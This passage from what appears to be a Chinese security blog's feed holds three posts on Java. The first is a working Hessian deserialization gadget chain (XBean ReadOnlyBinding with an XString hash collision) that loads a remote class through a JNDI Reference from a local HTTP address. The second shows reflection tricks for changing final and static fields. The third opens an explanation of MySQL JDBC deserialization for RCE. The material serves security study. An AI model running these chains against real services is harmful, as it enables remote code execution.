com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//创建ContextUtil.ReadOnlyBinding对象</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//放入ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>选择Context的实现类的时候有些可能报错在执行他的getEnvironment方法的时候，需要设置一些变量之类的，这里的WritableContext类就可以直接创建就能用</p></blockquote><h2 id="其他链"><a href="#其他链" class="headerlink" title="其他链"></a>其他链</h2><p>还有一些其他的链子比如Spring AOP之类的就不分析了，懒了主要是（</p><p>看一下师傅的文章就好，到时遇到再研究。</p><p>这篇文章有相关exp：<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下Hessian反序列化，主要参考su18师傅的文章：&lt;/p&gt;
&lt;h1 id=&quot;hessian简介&quot;&gt;&lt;a href=&quot;#Hessian简介&quot; class=&quot;headerlink&quot; title=&quot;Hessian简介&quot;&gt;&lt;/a&gt;Hessian简介&lt;/h1&gt;&lt;p&gt;直接抄s</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反射修改变量</title>
    <link href="https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/"/>
    <id>https://clowsman.github.io/2024/10/04/%E5%8F%8D%E5%B0%84%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F/</id>
    <published>2024-10-04T03:25:10.000Z</published>
    <updated>2024-10-04T03:26:39.492Z</updated>
    
    <content type="html"><![CDATA[<h1 id="低版本修改final和static"><a href="#低版本修改final和static" class="headerlink" title="低版本修改final和static"></a>低版本修改final和static</h1><p>参考文章：<a href="https://www.cnblogs.com/noKing/p/9038234.html">https://www.cnblogs.com/noKing/p/9038234.html</a></p><h2 id="修改static变量"><a href="#修改static变量" class="headerlink" title="修改static变量"></a>修改static变量</h2><p>这里和正常修改普通变量一样都是没问题的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改static变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;str&quot;</span>);<br>        str1.setAccessible(<span class="hljs-literal">true</span>);<br>        str1.set(test1,<span class="hljs-string">&quot;ceshi1&quot;</span>);<br>        System.out.println(Test1.str);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125754.png" alt="image-20241004100135810"></p><h2 id="修改final变量"><a href="#修改final变量" class="headerlink" title="修改final变量"></a>修改final变量</h2><p>这里有点不同</p><p>我们修改StringBuilder变量</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.setAccessible(<span class="hljs-literal">true</span>);<br>        name1.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi3&quot;</span>));<br>        System.out.println(test1.name);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125725.png" alt="image-20241004100649459"></p><p>看到是可以修改成功的</p><p>但是如果我们修改String变量会发现修改不成功，这是因为String类型的final变量，在优化时会将其变成常量，比如下面的System.out.println(test1.STR1);就会变成System.out.println(“test”);，所以其实赋值是成功了的，但是因为打印变成常量了所以没变化，我们可以用反射拿出值来验证一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String str=<span class="hljs-string">&quot;ceshi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default2&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br>        <span class="hljs-comment">//修改final的String变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi2&quot;</span>);<br>        System.out.println(test1.STR1);<br>        System.out.println(str11.get(test1));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125750.png" alt="image-20241004100943421"></p><p>可以看到确实是没问题的</p><p>那我们想要修改final变量就需要防止String类型变量在编译时被处理为常量，方法就是让其值的初始化经过运算才能得到，我们代码可以改成这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR1=(<span class="hljs-literal">null</span> == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;default4&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String STR2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default5&quot;</span>).toString();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//修改final的String变量</span><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR1&quot;</span>);<br>        str11.setAccessible(<span class="hljs-literal">true</span>);<br>        str11.set(test1,<span class="hljs-string">&quot;ceshi5&quot;</span>);<br>        System.out.println(test1.STR1);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;STR2&quot;</span>);<br>        str2.setAccessible(<span class="hljs-literal">true</span>);<br>        str2.set(test1,<span class="hljs-string">&quot;ceshi6&quot;</span>);<br>        System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>这两种方法我们都可以防止其被常量化</p><h2 id="修改同时被final和static修饰的变量"><a href="#修改同时被final和static修饰的变量" class="headerlink" title="修改同时被final和static修饰的变量"></a>修改同时被final和static修饰的变量</h2><p>此时通过常规反射的写法就会报错，如果我们要修改的话就需要先去除final修饰符才行</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//获取modifiers字段</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//去除final修饰符</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//将final修饰符设置回来</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用modifiers字段去除final修饰符即可修改。</p><blockquote><p> <code>Field</code> 类中的 <code>modifiers</code> 字段。这个字段是一个 <code>int</code> 类型的值，表示该字段的修饰符（如 <code>public</code>、<code>private</code>、<code>final</code> 等），该字段是一个私有字段。</p><p><code>Modifier.FINAL</code> 是一个常量，表示 <code>final</code> 修饰符的位掩码。</p></blockquote><h1 id="高版本修改final和static"><a href="#高版本修改final和static" class="headerlink" title="高版本修改final和static"></a>高版本修改final和static</h1><p>其他的反射修改都没有变化，就是修改同时被final和static修饰的变量的方法从Java12开始失效了，我在java17测试是直接没有modifiers这个字段了。这是因为高版本下不能通过getDeclaredFiled获取Field的属性。</p><p>这一点可以从fieldFilterMap里面知道</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>图中被过滤的类都不能直接通过公共反射获取他们的属性了，我们的Field类就在其中。</p><p>那就需要改一改方法了，这种方法对java8-java17都是适用的，参考文章：<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>我们可以改成用<strong>getDeclaredFields0</strong>方法来获取，从文章中可以知道他能返回一个Field数组对象，里面就包含了我们的modifiers属性</p><p>那我们的修改代码就可以改成下面这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//高版本反射同时修改static和final修饰的变量</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行的时候还需要添加模块，因为java12的高版本是模块化的，在vm-options添加修改即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;低版本修改final和static&quot;&gt;&lt;a href=&quot;#低版本修改final和static&quot; class=&quot;headerlink&quot; title=&quot;低版本修改final和static&quot;&gt;&lt;/a&gt;低版本修改final和static&lt;/h1&gt;&lt;p&gt;参考文章：&lt;a hr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="基础" scheme="https://clowsman.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-JDBC反序列化</title>
    <link href="https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/09/24/Mysql-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-09-24T15:07:50.000Z</published>
    <updated>2024-10-15T12:48:26.759Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下常见的JDBC反序列化，是MYSQL的，参考文章：<a href="https://tttang.com/archive/1877/">https://tttang.com/archive/1877/</a></p><h1 id="jdbc简单介绍"><a href="#JDBC简单介绍" class="headerlink" title="JDBC简单介绍"></a>JDBC简单介绍</h1><p>一个简单的查询demo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//加载驱动</span><br>        Class.forName(<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<br>        <span class="hljs-comment">//建立连接,可能要设置一下时区，可以设置为上海</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root123&quot;</span>);<br>        <span class="hljs-comment">//操作数据库执行增删改查</span><br>        <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br>        <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(<span class="hljs-string">&quot;select * from ceshi&quot;</span>);<br>        <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>            System.out.println(resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>若攻击者能控制JDBC连接设置项，则可以通过设置其配置指向恶意MySQL服务器触发ObjectInputStream.readObject()，构造反序列化利用链从而造成RCE。<br>通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞。<br>可被利用的两条查询语句：</p><ul><li><p>SHOW SESSION STATUS</p><p>此语句用于显示当前会话的状态信息。它提供了一系列关于会话级别的统计信息和变量的值，这些信息可以帮助开发者和数据库管理员了解当前会话的性能和行为。</p></li><li><p>SHOW COLLATION</p><p>此语句用于显示当前数据库中可用的字符集和排序规则（collation）。排序规则定义了如何比较和排序字符串。</p></li></ul><h1 id="serverstatusdiffinterceptor利用链"><a href="#ServerStatusDiffInterceptor利用链" class="headerlink" title="ServerStatusDiffInterceptor利用链"></a>ServerStatusDiffInterceptor利用链</h1><p>参考文章：<a href="https://xz.aliyun.com/t/8159?time__1311=n4+xnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD">https://xz.aliyun.com/t/8159?time__1311=n4%2BxnD0Dc7GQDtY40KDsA3xCTTNrKhK3DgAmoD</a></p><p>这里的环境如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span 